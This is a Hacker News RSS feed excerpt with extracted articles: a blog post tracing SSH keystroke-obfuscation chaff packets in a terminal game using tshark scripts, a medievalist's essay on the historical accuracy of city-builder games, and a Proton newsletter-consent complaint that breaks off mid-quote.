<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Fri, 23 Jan 2026 16:53:34 +0000</lastBuildDate><item><title>Why does SSH send 100 packets per keystroke?</title><link>https://eieio.games/blog/ssh-sends-100-packets-per-keystroke/</link><description>&lt;doc fingerprint="c61ded10eca0acfa"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Why does SSH send 100 packets per keystroke?&lt;/head&gt;
    &lt;p&gt;And why do I care?&lt;/p&gt;
    &lt;p&gt;Jan 22, 2026&lt;/p&gt;
    &lt;p&gt;Here are a few lines of summarized &lt;code&gt;tcpdump&lt;/code&gt; output for an ssh session where I send a single keystroke:&lt;/p&gt;
    &lt;code&gt;$ ./first_lines_of_pcap.sh single-key.pcap
  1   0.000s  CLIENT-&amp;gt;SERVER   36 bytes
  2   0.007s  SERVER-&amp;gt;CLIENT  564 bytes
  3   0.015s  CLIENT-&amp;gt;SERVER    0 bytes
  4   0.015s  CLIENT-&amp;gt;SERVER   36 bytes
  5   0.015s  SERVER-&amp;gt;CLIENT   36 bytes
  6   0.026s  CLIENT-&amp;gt;SERVER    0 bytes
  7   0.036s  CLIENT-&amp;gt;SERVER   36 bytes
  8   0.036s  SERVER-&amp;gt;CLIENT   36 bytes
  9   0.046s  CLIENT-&amp;gt;SERVER    0 bytes
 10   0.059s  CLIENT-&amp;gt;SERVER   36 bytes
&lt;/code&gt;
    &lt;p&gt;I said a “few” because there are a lot of these lines.&lt;/p&gt;
    &lt;code&gt;$ ./summarize_pcap.sh single-key.pcap
Total packets: 270

  36-byte msgs:   179 packets ( 66.3%)   6444 bytes
  Other data:       1 packet  (  0.4%)    564 bytes
  TCP ACKs:        90 packets ( 33.3%)

  Data sent:      6444 bytes in 36-byte messages,  564 bytes in other data
  Ratio:          11.4x more data in 36-byte messages than other data

  Data packet rate: ~90 packets/second (avg 11.1 ms between data packets)
&lt;/code&gt;
    &lt;p&gt;That is a lot of packets for one keypress. What’s going on here? Why do I care?&lt;/p&gt;
    &lt;head class="sc-4d1d4ca-1 bowwWe"&gt;here's those scripts if you're curious&lt;/head&gt;
    &lt;code&gt;# first_lines_of_pcap.sh
tshark -r "$1" \
  -T fields -e frame.number -e frame.time_relative -e ip.src -e ip.dst -e tcp.len | \
  awk 'NR&amp;lt;=10 {dir = ($3 ~ /71\.190/ ? "CLIENT-&amp;gt;SERVER" : "SERVER-&amp;gt;CLIENT");
       printf "%3d  %6.3fs  %-4s  %3s bytes\n", $1, $2, dir, $5}'
&lt;/code&gt;
    &lt;code&gt;# summarize_pcap.sh
tshark -r "$1" -Y "frame.time_relative &amp;lt;= 2.0" -T fields -e frame.time_relative -e tcp.len | awk '
  {
      count++
      payload = $2

      if (payload == 0) {
          acks++
      } else if (payload == 36) {
          mystery++
          if (NR &amp;gt; 1 &amp;amp;&amp;amp; prev_data_time &amp;gt; 0) {
              delta = $1 - prev_data_time
              sum_data_deltas += delta
              data_intervals++
          }
          prev_data_time = $1
      } else {
          game_data++
          game_bytes = payload
          if (NR &amp;gt; 1 &amp;amp;&amp;amp; prev_data_time &amp;gt; 0) {
              delta = $1 - prev_data_time
              sum_data_deltas += delta
              data_intervals++
          }
          prev_data_time = $1
      }
  }
  END {
      print "Total packets:", count
      print ""
      printf "  36-byte msgs:   %3d packets (%5.1f%%)  %5d bytes\n", mystery, 100*mystery/count, mystery*36
      printf "  Other data:     %3d packet  (%5.1f%%)  %5d bytes\n", game_data, 100*game_data/count, game_bytes
      printf "  TCP ACKs:       %3d packets (%5.1f%%)\n", acks, 100*acks/count
      print ""
      printf "  Data sent:      %d bytes in 36-byte messages,  %d bytes in other data\n", mystery*36, game_bytes
      printf "  Ratio:          %.1fx more data in 36-byte messages than other data\n", (mystery*36)/game_bytes
      print ""
      avg_ms = (sum_data_deltas / data_intervals) * 1000
      printf "  Data packet rate: ~%d packets/second (avg %.1f ms between data packets)\n", int(1000/avg_ms + 0.5), avg_ms
  }'
&lt;/code&gt;
    &lt;head rend="h2"&gt;Discovery&lt;/head&gt;
    &lt;p&gt;I am working on a high-performance game that runs over ssh. The TUI for the game is created in bubbletea 1 and sent over ssh via wish.&lt;/p&gt;
    &lt;p&gt;I have also forked bubbletea to make it faster. Stay tuned!&lt;/p&gt;
    &lt;p&gt;The game is played in an 80x60 window that I update 10 times a second. I’m targeting at least 2,000 concurrent players, which means updating ~100 million cells a second. I care about performance.&lt;/p&gt;
    &lt;p&gt;So I have a script that connects a few hundred bots over ssh and has them make a move a second. Then I use go’s outstanding profiling tools to look at what’s going on.&lt;/p&gt;
    &lt;p&gt;Yesterday I inadvertently broke my test harness. Instead of regularly sending game data, my server sent the bots a single message that said “your screen is too small.” This cut my game’s CPU and bandwidth usage in half.&lt;/p&gt;
    &lt;p&gt;At first I was disappointed. I (briefly) thought I had a free massive speedup on my hands, but it was actually a testing error.&lt;/p&gt;
    &lt;p&gt;But wait.&lt;/p&gt;
    &lt;p&gt;If I wasn’t sending game data back to my bots, why did CPU usage drop by 50% instead of 100%?&lt;/p&gt;
    &lt;head rend="h2"&gt;Investigation&lt;/head&gt;
    &lt;p&gt;As part of debugging the test harness issue, I used &lt;code&gt;tcpdump&lt;/code&gt; to log game traffic with and without the breaking change. Something like:&lt;/p&gt;
    &lt;code&gt;# The game runs on port 22
timeout 30s tcpdump -i eth0 'port 22' -w with-breaking-change.pcap
# Revert change
timeout 30s tcpdump -i eth0 'port 22' -w without-breaking-change.pcap
&lt;/code&gt;
    &lt;p&gt;Our breaking change stopped us from rendering our game over ssh. So &lt;code&gt;with-breaking-change.pcap&lt;/code&gt; contains packets that represent the overhead of each connection without actually rendering the game.&lt;/p&gt;
    &lt;p&gt;I was debugging this with Claude Code, so I asked it to summarize what it saw in the pcap.&lt;/p&gt;
    &lt;code&gt;Wanna take a look yourself? I put with-breaking-change.pcap in this directory

--

Wow! Here's what I found:

Packet Size Distribution (413,703 total packets):
274,907 packets (66%): Exactly 36 bytes
138,778 packets (34%): 0 bytes (TCP ACKs)
18 packets (&amp;lt;0.1%): 72 bytes
&lt;/code&gt;
    &lt;p&gt;Further analysis on a smaller pcap pointed to these mysterious packets arriving ~20ms apart.&lt;/p&gt;
    &lt;p&gt;This was baffling to me (and to Claude Code). We kicked around several ideas like:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;SSH flow control messages&lt;/item&gt;
      &lt;item&gt;PTY size polling or other status checks&lt;/item&gt;
      &lt;item&gt;Some quirk of bubbletea or wish&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;One thing stood out - these exchanges were initiated by my ssh client (stock ssh installed on MacOS) - not by my server.&lt;/p&gt;
    &lt;p&gt;On a hunch, I took a &lt;code&gt;tcpdump&lt;/code&gt; of a regular ssh session.&lt;/p&gt;
    &lt;code&gt;# on my mac, in one tab
sudo tcpdump -ien0 'port 22'

# on my mac, in another tab
ssh $some_vm_of_mine
&lt;/code&gt;
    &lt;p&gt;I waited for the initial connection chatter to die down, sent one keystroke to my remote vm, and looked at the &lt;code&gt;tcpdump&lt;/code&gt; output.&lt;/p&gt;
    &lt;p&gt;I saw the exact same pattern! What in the world?&lt;/p&gt;
    &lt;head rend="h2"&gt;Root cause&lt;/head&gt;
    &lt;p&gt;Once I realized that this was a property of stock ssh and not my game, debugging got a lot easier.&lt;/p&gt;
    &lt;p&gt;Running &lt;code&gt;ssh -vvv&lt;/code&gt; gave me a pretty good sense of what was going on:&lt;/p&gt;
    &lt;code&gt;debug3: obfuscate_keystroke_timing: starting: interval ~20ms
debug3: obfuscate_keystroke_timing: stopping: chaff time expired (49 chaff packets sent) 
debug3: obfuscate_keystroke_timing: starting: interval ~20ms
debug3: obfuscate_keystroke_timing: stopping: chaff time expired (101 chaff packets sent)
&lt;/code&gt;
    &lt;p&gt;That &lt;code&gt;20ms&lt;/code&gt; is a smoking gun - it lines up perfectly with the mysterious pattern we saw earlier! And the rest of the message is pretty helpful too - we sent 49 “chaff” packets for the first keystroke and 101 “chaff” for around the second one.&lt;/p&gt;
    &lt;p&gt;In 2023, ssh added keystroke timing obfuscation. The idea is that the speed at which you type different letters betrays some information about which letters you’re typing. So ssh sends lots of “chaff” packets along with your keystrokes to make it hard for an attacker to determine when you’re actually entering keys.&lt;/p&gt;
    &lt;p&gt;That makes a lot of sense for regular ssh sessions, where privacy is critical. But it’s a lot of overhead for an open-to-the-whole-internet game where latency is critical.&lt;/p&gt;
    &lt;head rend="h2"&gt;Remediation&lt;/head&gt;
    &lt;p&gt;Keystroke obfuscation can be disabled client-side. After reverting my original breaking change, I tried updating my test harness to pass &lt;code&gt;ObscureKeystrokeTiming=no&lt;/code&gt; when starting up ssh sessions.&lt;/p&gt;
    &lt;p&gt;This worked great. CPU usage dropped dramatically and bots still received valid data.&lt;/p&gt;
    &lt;p&gt;But this is hardly a solution in the real world. I want &lt;code&gt;ssh mygame&lt;/code&gt; to Just Work without asking users to pass options that they might not understand.&lt;/p&gt;
    &lt;p&gt;Claude Code originally didn’t have much faith that we could disable this functionality server-side.&lt;/p&gt;
    &lt;p&gt;generated with simon wilson's excellent claude-code-transcripts tool&lt;/p&gt;
    &lt;p&gt;Fortunately, the description I found of SSH keystroke obfuscation made it easy to look up the relevant code in go’s ssh library (which I was transitively depending on).&lt;/p&gt;
    &lt;code&gt;Log message:
Introduce a transport-level ping facility

This adds a pair of SSH transport protocol messages SSH2_MSG_PING/PONG
to implement a ping capability. These messages use numbers in the "local
extensions" number space and are advertised using a "[email protected]"
ext-info message with a string version number of "0".
&lt;/code&gt;
    &lt;p&gt;The “chaff” messages that ssh uses to obscure keystrokes are SSH2_MSG_PING messages. And they’re sent to servers that advertise the availability of the &lt;code&gt;[email protected]&lt;/code&gt; extension. What if we just…don’t advertise &lt;code&gt;[email protected]&lt;/code&gt;?&lt;/p&gt;
    &lt;p&gt;I searched go’s ssh library for &lt;code&gt;[email protected]&lt;/code&gt; and found the commit where support was added. The commit was tiny and seemed very easy to revert.&lt;/p&gt;
    &lt;p&gt;I cloned the go crypto repo and told Claude to revert this change and update our dependencies to use our clone (go’s replace directive makes forking a library very easy).&lt;/p&gt;
    &lt;p&gt;Then I re-ran my test harness. The results were…very good:&lt;/p&gt;
    &lt;code&gt;Total CPU  29.90%          -&amp;gt; 11.64%
Syscalls   3.10s           -&amp;gt; 0.66s
Crypto     1.6s            -&amp;gt; 0.11s
Bandwidth  ~6.5 Mbit/sec   -&amp;gt; ~3 Mbit/sec
&lt;/code&gt;
    &lt;p&gt;Claude was also pretty pumped:&lt;/p&gt;
    &lt;p&gt;yes it's 1:30 am what of it&lt;/p&gt;
    &lt;p&gt;Obviously forking go’s crypto library is a little scary, and I’m gonna have to do some thinking about how to maintain my little patch in a safe way.&lt;/p&gt;
    &lt;p&gt;But this is a huge improvement. I’ve spent much of the last week squeezing out small single-digit performance wins. A &amp;gt;50% drop was unimaginable to me.&lt;/p&gt;
    &lt;head rend="h2"&gt;Debugging with LLMs was fun&lt;/head&gt;
    &lt;p&gt;I’ve been thinking about whether LLMs remove parts of the problem-solving process that I enjoy. But I’ve gotta say, debugging this problem using Claude Code was super fun.&lt;/p&gt;
    &lt;p&gt;I am familiar enough with &lt;code&gt;tcpdump&lt;/code&gt;, &lt;code&gt;tshark&lt;/code&gt;, and friends to know what they can do. But I don’t use them regularly enough to be fast with them. Being able to tell an agent “here’s a weird pcap - tell me what’s going on” was really lovely. And by watching commands as the agent ran them I was able to keep my mental model of the problem up to date.&lt;/p&gt;
    &lt;p&gt;There were still edge cases. At some point in my confusion I switched to ChatGPT and it very confidently told me that my tcpdump output was normal ssh behavior:&lt;/p&gt;
    &lt;p&gt;do all chatgpt messages have this tone and formatting now?&lt;/p&gt;
    &lt;p&gt;And then doubled down when I pushed back:&lt;/p&gt;
    &lt;p&gt;no!!!&lt;/p&gt;
    &lt;p&gt;Similarly, I had to push Claude Code to consider forking go’s ssh library. And I had to make the original leap of “wait…if our test harness was broken, why was usage not 0%?”&lt;/p&gt;
    &lt;p&gt;When you say “LLMs did not fully solve this problem” some people tend to respond with “you’re holding it wrong!”&lt;/p&gt;
    &lt;p&gt;I think they’re sometimes right! Interacting with LLMs is a new skill, and it feels pretty weird if you’re used to writing software like it’s 2020. A more talented user of LLMs may have trivially solved this problem.&lt;/p&gt;
    &lt;p&gt;But the best way to develop a skill is by practicing it. And for me, that means figuring out how to transfer my problem-solving intuitions to the tools that I’m using.&lt;/p&gt;
    &lt;p&gt;Besides. Being in the loop is fun. How else would I write this post?&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46723990</guid><pubDate>Thu, 22 Jan 2026 19:27:32 +0000</pubDate></item><item><title>Capital One to acquire Brex for $5.15B</title><link>https://www.reuters.com/legal/transactional/capital-one-buy-fintech-firm-brex-515-billion-deal-2026-01-22/</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46725288</guid><pubDate>Thu, 22 Jan 2026 21:23:12 +0000</pubDate></item><item><title>Why medieval city-builder video games are historically inaccurate (2020)</title><link>https://www.leidenmedievalistsblog.nl/articles/why-medieval-city-builder-video-games-are-historically-inaccurate</link><description>&lt;doc fingerprint="b302597347b4065b"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Why medieval city-builder video games are historically inaccurate&lt;/head&gt;
    &lt;p&gt;This blog post explores the historical accuracy of medieval city-builder video games.&lt;/p&gt;
    &lt;head rend="h3"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;Since many of us are working from home in these trying times, it seems safe to assume that more people than ever are indulging in playing the occasional computer game. A city builder is a specific kind of computer game in which you design a city, extract resources, set up production chains and ensure that your settlement grows. City builders are very similar to strategy games as they reward patience and strategy. In this article, I will take a look at one sub-genre of the city builder, the medieval city builder, and explain how this gaming genre relates to our knowledge of medieval settlement planning.&lt;/p&gt;
    &lt;head rend="h3"&gt;Historical city builders&lt;/head&gt;
    &lt;p&gt;The city builder has its origins far back in the 1990s in the combination of the strategy genre and the management genre, leading to games such as Sim City (1989), Caesar (1992) and Age of Empires (1997).&lt;/p&gt;
    &lt;p&gt;It did not take long before medieval-themed city builders popped up. We may think of Settlers (1993) and Knights and Merchants (1998). In addition, the Anno games (1998-2019), although initially set in the 1600s basically had a medieval theme.&lt;/p&gt;
    &lt;p&gt;These games often start with plopping down a village center on a promising location near abundant resources. You then continue to gather these resources which grant you building materials for building new homes and facilities for your settlement.&lt;/p&gt;
    &lt;p&gt;Setting up specialized production chains might involve growing grain, milling the grain for flour and turning the flour into bread which feeds your villages. Similarly, another production chain might involve rearing sheep for their wool, turning the wool into cloth and turning the cloth into clothing. When done correctly, the reward of correct investments and planning is that you see your settlement grow.&lt;/p&gt;
    &lt;p&gt;This often leads to settlements growing organically from a couple of houses around a community center to a larger settlement with hundreds of people. However logical such an organic growth of a settlement might seem, it is not historically accurate.&lt;/p&gt;
    &lt;head rend="h3"&gt;Medieval village life &lt;/head&gt;
    &lt;p&gt;&lt;lb/&gt;Any gameplay loop that tells a story of linear settlement growth is incongruent with how a medieval economy worked (see Foussier 2004). Medieval villagers were often living on the edge of subsistence. Agricultural surpluses were skimmed by the church and the feudal lords. Bad harvests, banditry, warfare and disease might decimate a village community at any time. For this very reason, the demography of many European villages remained relatively stable between the twelfth and the eighteenth century. It may therefore be clear that the gameplay loop of city builders pivots around the concept of doing the historically exceptional (i.e. growing a settlement to a town) and thereby strays far from what actually happened in the lives of our medieval forebears. &lt;lb/&gt;A notable exception to this genre trope is the game Banished (2014) in which high mortality rates and bad weather do seriously stifle any kind of linear growth. In this city builder you are constantly fighting the odds and settlement growth is not guaranteed. However, also in Banished it is your goal to overcome the stagnation and lead your settlement to expansion.&lt;/p&gt;
    &lt;p&gt;A thing that is rarely touched upon in medieval city builders is how complex village life actually was. This can be exemplified by how the community related to its overlords. Land ownership here is key. Land in the community might be owned by a lord, a local liegeman, a monastery or even directly by the duke or count. Taxes, rents and tithes were the organisational structures in which the landowner was tied to the farmers who worked the fields. Often the payment of taxes and tithes was linked to feast days and the visit of the tax collector represented a big event in the agricultural year. An interesting side note is that some obligations which the commoners had to the lord and the church (such as seigneurial duties like working a mill) might drain the community from the needed manpower for tilling the land. Furthermore, a rural community that was its own seigneury had access to a law court with sheriff, aldermen and a local militia (Middle Dutch schutterie) to fight off bandits with. Harsh capital punishments were set in place to deter anyone from raiding the farms and hamlets and the village gallows were often the first thing one saw when approaching a medieval settlement.&lt;/p&gt;
    &lt;head rend="h3"&gt;Planning a medieval settlement&lt;/head&gt;
    &lt;p&gt;But something that is much more fundamental to the theme of a settlement building game, is how medieval settlements were actually planned and grew. Landscape historians and archaeologists have acquired a lot of insight into how this worked.&lt;/p&gt;
    &lt;p&gt;Let's start with the realization that medieval settlements in their first stages of development were planned and laid out according to a specific design. In my own research into the settlement history of West-Brabant (southern Netherlands, from 1000 to 1300 CE) I have encountered the following types.&lt;/p&gt;
    &lt;p&gt;Here is a sketch of a Brabantine circular manor (Middle Dutch vroonhoeve). This is a reinforced circular homestead with moat, often next to a bend in the river, containing several farms and a fan-like plot pattern radiating out from it. Such manors were often called BORCH.&lt;/p&gt;
    &lt;p&gt;Here is a sketch of a Brabantine street settlement, often built with exploitation of nearby fenland in mind. It consists of a line of farms with associated evenly sized rectangular plots built in a line perpendicular to a raised road.&lt;/p&gt;
    &lt;p&gt;Here is a more complex exploitation village which is set up with a moated enclosed church homestead and a central meadow as its center. There is a line of farms next to the road. The arable land to the east is bordered by a ditch supplying fresh drinking water (Middle Dutch bansloot). In layout, this type represents a hybrid between the two earlier settlement types.&lt;/p&gt;
    &lt;p&gt;Let us first make clear that these different types of exploitation settlements often existed alongside each other and can be found in one and the same region. In part, the different types reflect different chronological layers but some types were also more suited to certain geographical environments than others.&lt;/p&gt;
    &lt;p&gt;So how were these settlements planned? Many medieval exploitation enterprises were initiated by a monastery or a consortium of free men who were granted permission by (or bought permission from) the feudal lord to “colonize” the wilderness.&lt;/p&gt;
    &lt;p&gt;Clearing the wooded landscape in order to create arable land was done by cutting away the trees and bushes (Middle Dutch rode) or, alternatively, burning it away in controlled fires (Middle Dutch brant).&lt;/p&gt;
    &lt;p&gt;Land surveyors sent by the lord would then measure out the block or strips that would be taken in cultivation. Strips of arable land were often 1250m deep (6 Middle Dutch voorlingen = furlongs) so that the plough could go straight in a long line before having to turn. Important blocks or strips were demarcated by hedges, earthwork, woodwork, ditches or roads. Medieval names for these blocks often survived into the modern day.&lt;/p&gt;
    &lt;p&gt;The presence of drinking water (a river or a brook) in the vicinity was an important factor in choosing the location for the settlement. The vicinity of water entailed risk and reward because flooding was an ever present danger. Floods could devastate arable land but might also fertilize it. Meadows in particular were often situated in flood areas.&lt;/p&gt;
    &lt;head rend="h3"&gt;Managing a settlement&lt;/head&gt;
    &lt;p&gt;So how was such a settlement managed? First of all, the quality of the soil had to be carefully controlled by crop rotation: specific crops were sown on different segments of the arable land with one part laying fallow to recover from the tilling (English three-field system, Dutch drieslagstelsel). The cattle and sheep were put out to pasture on the common meadows guarded by a shepherd or cowherd. Pigs were allowed to forage in the nearby forests and killed in autumn before the winter starvation set in.&lt;/p&gt;
    &lt;p&gt;Roads and rivers were important for transport of crops and livestock. These roads, some of them paved, some of them not, needed to be maintained. They were essential to the payment of the tithe, since tithe collectors assessed the harvest on the field and later collected the sheaves on the side of the road.&lt;/p&gt;
    &lt;p&gt;The buildings within the community also needed maintenance. Farmhouses, community barns and stables were made of wood and had to be rebuilt every few generations, only the name of the farm or homestead being continued.&lt;/p&gt;
    &lt;p&gt;So what kind of threats did a medieval settlement face? First of all, the weather was an important factor which dictated the success of the harvest. Storms, droughts and floods could devastate the harvest and decimate the community.&lt;/p&gt;
    &lt;p&gt;Diseases and epidemics were another danger threatening the community. The situation on the countryside was a lot better in this regard than in the medieval towns, but an epidemic could still mean the end of a village. Similarly, diseases among livestock impacted the medieval subsistence economy in a brutal way.&lt;/p&gt;
    &lt;p&gt;Then there are the consequences of medieval warfare affecting the community: Armies that passed by could plunder the village, burn the farms and execute villagers at will. Or they could also demand supplies, food and provisions as an emergency "tax"&lt;/p&gt;
    &lt;p&gt;But war also brought indirect consequences; a liege lord calling the banners and levying troops from the village community might extract a large part of the adult men. Warfare also disrupted the trade networks that supplied a village with building materials and commodities.&lt;/p&gt;
    &lt;p&gt;Then there were internal threats to the fabric of the village community. We may think of social unrest because of land disputes. Feuds could also tear a community apart with endemic vendetta’s causing death and despair. A socially unstable society was also more prone to internal accusations of heresy and witchcraft.&lt;/p&gt;
    &lt;head rend="h3"&gt;An “accurate” medieval settlement builder&lt;/head&gt;
    &lt;p&gt;So, which of the above listed features could potentially contribute to a more historically accurate computer game about medieval settlement building? First of all, it would be more realistic if the settlement could first be planned out and was not forced to "grow organically" from a community center. The first settlement phase would be a test of how “successful” a layout is in adapting to the exigencies of the terrain and the needs of the community. Only after that initial layout proved successful, further expansions can be planned.&lt;/p&gt;
    &lt;p&gt;Secondly, it would be more realistic if we could build both straight roads and curved roads, just as in Cities Skylines (2015), a modern city builder well known for its incredibly flexible layout tools. Incidentally, the tools of Cities Skylines can also be used to recreate medieval settlements, as was done by YouTube creator Play Curiously who constructed an impression of a medieval Croatian village.&lt;/p&gt;
    &lt;p&gt;Such a flexible road drawing tool can then also be used to lay out ditches, hedges and enclosures since these features were central to the medieval experience of the cultivated landscape.&lt;/p&gt;
    &lt;p&gt;Thirdly, It would be interesting to see a medieval-themed game embrace the concept of flood valleys that limit and endanger pasture and arable land. Other historical city builders such as Pharaoh (1999) and Children of the Nile (2004) already implemented this feature for their setting in Ancient Egypt. However, such a mechanic would likewise fit a medieval city builder and show the general public how medieval society dealt with seasonal flooding as well as the devastating effects that storm floods could have.&lt;/p&gt;
    &lt;p&gt;And finally, something that would, in my opinion, really add to the realism and historical flavor of a medieval-themed city builder would be the introduction of mechanisms in which agricultural surpluses are skimmed by the church and the feudal lord. Tithes, taxes and rents! Instead of merely abstracting the taxes into an income modifier or letting the player be the extractor himself, we could be shown the tax collector visiting the village, counting the sheaves by the side of the road, selecting the calves and chickens. This way, the experiences of our medieval forebears are visualized and may help to educate the public about medieval village life.&lt;/p&gt;
    &lt;head rend="h3"&gt;Why not?&lt;/head&gt;
    &lt;p&gt;There are some good reasons why city building games are not that historically accurate and instead adhere to the established formula of the city building game.&lt;/p&gt;
    &lt;p&gt;First of all, a linear growth model makes sense from a gameplay perspective, since it is rewarding to see your settlement grow.in a linear way. It fosters a feeling of progress and motivates the player to keep momentum and push through to the next expansion phase. Secondly, games are generally wary of punishing failure too harshly in order to avoid demoralizing the player. Thirdly, in order to facilitate path finding for the simulated villagers it is easier to implement a gridlike road and building system rather than an off-grid building system that allows for curvy roads. So far only Cities Skylines has managed to do this in a satisfactory way.&lt;/p&gt;
    &lt;p&gt;Lastly, for marketing purposes and recognizability, game developers generally don't stray too far from the image of the Middle Ages that the public is already acquainted with. For a medieval city builder this means windmills, industrious peasants, lots of sheep and stone castles. Things like land surveying, crop rotation and tithe collection do not fit this image and challenge the romanticized picture of the uneducated farmer in his pre-industrial environment.&lt;/p&gt;
    &lt;head rend="h3"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;Although I think medieval-themed city building games could benefit from incorporating some of the things we know about medieval settlement history into the gameplay loop, it may not be desirable for game developers to stray too far from the established formula. The idea that medieval settlements developed organically according to messy road plans is strongly imbedded in popular perception. Allowing both straight and curved road building in medieval city builders, may serve to challenge some of the stereotypes that exist about medieval village life. And if you ask me, that would be a good thing for it is an enriching experience to see the world through the eyes of our medieval forebears. One may find out that their lives were not that different after all...&lt;/p&gt;
    &lt;head rend="h3"&gt;Further reading&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Fossier, R. (2004). “The Rural Economy and Demographic Growth.” In: D. Luscombe &amp;amp; J. Riley-Smith (Eds.). The New Cambridge Medieval History. Cambridge: Cambridge University Press, 11-46.&lt;/item&gt;
      &lt;item&gt;Van Ham, W. (1979). “Dorp en dorpsleven in middeleeuws Wouw." in: A. Delahaye (red.), De Heren XVII van Nassau-Brabant, 316-336.”&lt;/item&gt;
      &lt;item&gt;(forthc.) Kerkhof, P.A. (2020). “Saer, Saert; een Zuid-Nederlandse veldnaam van onzekere oorsprong.” Noordbrabants Historisch Jaarboek.&lt;/item&gt;
      &lt;item&gt;Leenders, K.A.H.W. (1996). "Noord-Vlaanderen en de Noordwesthoek; een vergelijking." Tijdschrift voor Waterstaatsgeschiedenis 5, 67-73.&lt;/item&gt;
      &lt;item&gt;Leenders, K.A.H.W. (1989). Verdwenen venen; een onderzoek naar de ligging en exploitatie van thans verdwenen venen in het gebied tussen Antwerpen, Turnhout, Geertruidenberg en Willemstad (1250-1750). Reeks Landschapsstudies 13, Wageningen.&lt;/item&gt;
      &lt;item&gt;Oosthuizen, S. (2017). The Anglo-Saxon fenland. Windgather Press.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;© Alexia Kerkhof and Leiden Medievalists Blog, 2020. Unauthorised use and/or duplication of this material without express and written permission from this site’s author and/or owner is strictly prohibited. Excerpts and links may be used, provided that full and clear credit is given to Alexia Kerkhof and Leiden Medievalists Blog with appropriate and specific direction to the original content.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46726857</guid><pubDate>Fri, 23 Jan 2026 00:22:58 +0000</pubDate></item><item><title>I built a light that reacts to radio waves [video]</title><link>https://www.youtube.com/watch?v=moBCOEiqiPs</link><description>&lt;doc fingerprint="50559455455d1642"&gt;
  &lt;main&gt;
    &lt;p&gt;About Press Copyright Contact us Creators Advertise Developers Terms Privacy Policy &amp;amp; Safety How YouTube works Test new features NFL Sunday Ticket © 2026 Google LLC&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46728808</guid><pubDate>Fri, 23 Jan 2026 05:34:35 +0000</pubDate></item><item><title>Proton Spam and the AI Consent Problem</title><link>https://dbushell.com/2026/01/22/proton-spam/</link><description>&lt;doc fingerprint="ef5f40914ea2becf"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Proton Spam and the AI Consent Problem&lt;/head&gt;
    &lt;p&gt;On Jan 14th Proton sent out an email newsletter with the subject line:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Introducing Projects - Try Lumoâs powerful new feature now&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;Lumo is Protonâs &lt;/p&gt;
    &lt;p&gt;There is a problem with this email. And Iâm not talking about the question of how exactly AI aligns with Protonâs core values of privacy and security.&lt;/p&gt;
    &lt;p&gt;The problem is I had already explicitly opted out of Lumo emails.&lt;/p&gt;
    &lt;p&gt;That toggle for âLumo product updatesâ is unchecked. Lumo is the only topic Iâm not subscribed to. Proton has over a dozen newsletters, including some crypto nonsense. I opt-in to everything but Lumo, I gave an undeniable no to Lumo emails.&lt;/p&gt;
    &lt;p&gt;So the email I received from Proton is spam, right?&lt;/p&gt;
    &lt;p&gt;My understanding is that spam is a violation of GDPR and UK data protection laws. Regardless, Protonâs email is a clear abuse of their own service towards a paying business customer.&lt;/p&gt;
    &lt;p&gt;Before I grab my pitchfork I emailed Proton support.&lt;/p&gt;
    &lt;head rend="h2"&gt;Proton Support&lt;/head&gt;
    &lt;p&gt;Despite the subject line and contents, and despite the âFrom Lumoâ name and &lt;code&gt;@lumo.proton.me&lt;/code&gt; address, maybe this was an honest mistake?&lt;/p&gt;
    &lt;p&gt;Protonâs first reply explained how to opt-out.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Hello David,&lt;/p&gt;
      &lt;p&gt;Thank you for contacting us.&lt;/p&gt;
      &lt;p&gt;You can unsubscribe from the newsletters if you do the following:&lt;/p&gt;
      &lt;p&gt;- Log in to your account at https://account.protonvpn.com/login&lt;/p&gt;
      &lt;p&gt;- Navigate to the Account category&lt;/p&gt;
      &lt;p&gt;- Disable the check-marks under âEmail subscriptionsâ&lt;/p&gt;
      &lt;p&gt;- If you need additional assistance, let me know.&lt;/p&gt;
      &lt;p&gt;[screenshot of the same opt-out toggle]&lt;/p&gt;
      &lt;p&gt;-Have a nice day.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;John Support directs me to the exact same âLumo product updatesâ toggle I had already unchecked. I replied explaining that I had already opted out. Support replies saying theyâre âchecking this with the teamâ then later replies again asking for screenshots.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Can you make sure to send me a screenshot of this newsletter option disabled, as well as the date when the last message was sent to you regarding the Lumo offer?&lt;/p&gt;
      &lt;p&gt;You can send me a screenshot of the whole message, including the date.&lt;/p&gt;
      &lt;p&gt;Is it perhaps 14 January 2026 that you received the message?&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;I found that last line curious, are they dealing with other unhappy customers? Maybe Iâm reading too much into it.&lt;/p&gt;
    &lt;p&gt;I sent the screenshots and signed off with âDonât try to pretend this fits into another newsletter category.â&lt;/p&gt;
    &lt;p&gt;After more âchecking this with the teamâ I got a response today.&lt;/p&gt;
    &lt;quote&gt;
